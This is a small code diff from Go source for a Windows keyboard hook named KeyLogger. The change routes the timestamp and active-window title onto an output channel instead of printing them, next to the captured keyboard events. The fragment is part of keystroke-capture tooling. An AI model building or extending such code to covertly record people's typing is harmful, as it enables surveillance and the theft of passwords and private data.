@@ -40,7 +40,7 @@ func (kl *KeyLogger) hook(nCode int, wParam types.WPARAM, lParam types.LPARAM) t
 
 	if windowName != kl.previousWindowName {
 		kl.previousWindowName = windowName
-		fmt.Printf("\n%s - %s\n", time.Now().Local().String(), windowName)
+		kl.Decoder.output <- fmt.Sprintf("\n%s - %s\n", time.Now().Local().String(), windowName)
 	}
 
 	kl.input <- NewKeyboardEvent(wParam, lParam, layout)
